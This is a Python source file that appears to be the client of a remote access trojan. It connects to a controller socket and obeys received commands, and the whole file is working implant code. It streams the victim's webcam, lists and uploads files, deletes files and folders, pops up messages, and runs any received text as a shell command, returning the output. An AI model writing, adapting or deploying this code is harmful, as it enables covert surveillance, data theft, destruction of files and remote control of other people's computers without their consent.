import sys
import socket
import subprocess
import cv2
import pickle
import struct
import os
import tkinter as tk

HOST = 'localhost'
PORT = 5555

s = socket.socket()
s.connect((HOST, PORT))
msg = s.recv(1024).decode()
print('[*] server:', msg)

# Initialize the camera
camera = cv2.VideoCapture(0)

# Create a Tkinter window for message display
root = tk.Tk()
root.title("Message Display")

message_label = tk.Label(root, text="", wraplength=300)
message_label.pack()

def display_message(message):
    message_label.config(text=message)

def remove_file(file_path):
    try:
        os.remove(file_path)
        return True, f"Successfully removed file: {file_path}"
    except OSError as e:
        return False, f"Error: Failed to remove file: {file_path}\n{str(e)}"

def remove_folder(folder_path):
    try:
        os.rmdir(folder_path)
        return True, f"Successfully removed folder: {folder_path}"
    except OSError as e:
        return False, f"Error: Failed to remove folder: {folder_path}\n{str(e)}"

while True:
    cmd = s.recv(1024).decode()
    print(f'[*] received: {cmd}')
    
    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
        break

    if cmd.lower() == 'sys':
        system_info = sys.platform.encode()
        s.send(system_info)
        continue

    if cmd.lower() == 'camera':
        while True:
            _, frame = camera.read()
            frame_data = pickle.dumps(frame)
            frame_size = struct.pack('!I', len(frame_data))
            s.sendall(frame_size + frame_data)
            if cv2.waitKey(1) == ord('q'):
                break
        continue

    if cmd.lower() == 'ls':
        file_list = os.listdir('.')
        path_list = [os.path.abspath(f) for f in file_list]
        path_data = pickle.dumps(path_list)
        path_size = struct.pack('!I', len(path_data))
        s.sendall(path_size + path_data)
        continue

    if cmd.lower().startswith('cd '):
        foldername = cmd.split(' ', 1)[1]
        if not foldername:
            continue  

        if foldername == '..':
            os.chdir('..')
            continue
        else:
            try:
                os.chdir(foldername)
                print("Directory changed to:", os.getcwd())
            except FileNotFoundError:
                print("Folder does not exist.")
                continue
            
    if cmd.lower().startswith('get '):
        filename = cmd.split(' ', 1)[1]
        try:
            with open(filename, 'rb') as file:
                file_data = file.read()
            file_size = struct.pack('!I', len(file_data))
            s.sendall(file_size + file_data)
        except FileNotFoundError:
            print("File does not exist.")
            continue

    if cmd.lower().startswith('rm '):
        path = cmd.split(' ', 1)[1]
        if os.path.isfile(path):
            success, result = remove_file(path)
        elif os.path.isdir(path):
            success, result = remove_folder(path)
        else:
            success = False
            result = f"Error: Path not found: {path}"

        if success:
            result_data = pickle.dumps(result)
        else:
            result_data = pickle.dumps(result.encode())

        result_size = struct.pack('!I', len(result_data))
        s.sendall(result_size + result_data)

    if cmd.lower().startswith('msg '):
        # Extract the message from the command
        message = cmd.split(' ', 1)[1]
        print(msg)
        display_message(message)  # Display the message in the Tkinter window

    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except subprocess.CalledProcessError as e:
        result = str(e.output).encode()
    except Exception as e:
        result = str(e).encode()

    result_data = pickle.dumps(result)
    result_size = struct.pack('!I', len(result_data))
    s.sendall(result_size + result_data)

s.close()
camera.release()
cv2.destroyAllWindows()

root.mainloop()  # Start the Tkinter main loop
